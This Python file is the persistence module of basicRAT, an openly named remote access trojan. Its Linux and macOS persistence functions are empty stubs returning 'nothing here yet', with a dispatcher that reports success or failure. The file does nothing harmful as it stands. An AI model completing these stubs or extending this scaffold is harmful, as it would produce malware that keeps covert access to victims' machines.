#
# basicRAT persistence module
# https://github.com/vesche/basicRAT
#

import sys


def linux_persistence():
    return False, 'nothing here yet'


def mac_persistence():
    return False, 'nothing here yet'


def run(plat):
    if plat == 'nix':
        success, details = linux_persistence()
    elif plat == 'mac':
        success, details = mac_persistence()
    else:
        return 'Error, platform unsupported.'

    if success:
        results = 'Persistence successful, {}.'.format(details)
    else:
        results = 'Persistence unsuccessful, {}.'.format(details)

    return results
